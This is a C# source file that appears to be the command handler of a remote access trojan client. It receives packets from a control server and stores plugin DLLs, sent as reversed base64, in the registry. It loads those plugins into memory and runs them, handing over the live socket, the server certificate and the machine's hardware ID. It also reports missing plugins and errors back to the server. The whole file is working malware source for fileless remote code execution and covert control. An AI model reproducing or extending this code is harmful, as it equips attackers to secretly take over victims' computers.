using Client.Algorithm;
using Client.Helper;
using Client.MessagePack;
using Client.Connection;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Collections.Generic;
using Microsoft.VisualBasic;

namespace Client.Handle_Packet
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "Ping":
                        {
                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }

                    case "plugin": // run plugin in memory
                        {
                            Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))));
                            Type type = assembly.GetType("Plugin.Plugin");
                            dynamic instance = Activator.CreateInstance(type);
                            instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), Methods._appMutex, Settings.MTX, Settings.BDOS, Settings.Install);
                            break;
                        }

                    case "savePlugin": // save plugin as MD5:Base64
                        {
                            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").AsString);
                            Debug.WriteLine("plguin saved");
                            break;
                        }

                    case "checkPlugin": // server sent all plugins hashes, we check which plugin we miss
                        {
                            List<string> plugins = new List<string>();
                            foreach (string plugin in unpack_msgpack.ForcePathObject("Hash").AsString.Split(','))
                            {
                                if (SetRegistry.GetValue(plugin.Trim()) == null)
                                {
                                    plugins.Add(plugin.Trim());
                                    Debug.WriteLine("plguin not found");
                                }
                            }
                            if (plugins.Count > 0)
                            {
                                MsgPack msgPack = new MsgPack();
                                msgPack.ForcePathObject("Packet").SetAsString("sendPlugin");
                                msgPack.ForcePathObject("Hashes").SetAsString(string.Join(",", plugins));
                                ClientSocket.Send(msgPack.Encode2Bytes());
                            }
                            break;
                        }

                    //case "cleanPlugin": // server want to clean and re save all plugins
                    //    {
                    //        SetRegistry.DeleteSubKey();
                    //        MsgPack msgPack = new MsgPack();
                    //        msgPack.ForcePathObject("Packet").SetAsString("sendPlugin+");
                    //        ClientSocket.Send(msgPack.Encode2Bytes());
                    //        break;
                    //    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }

    }
}
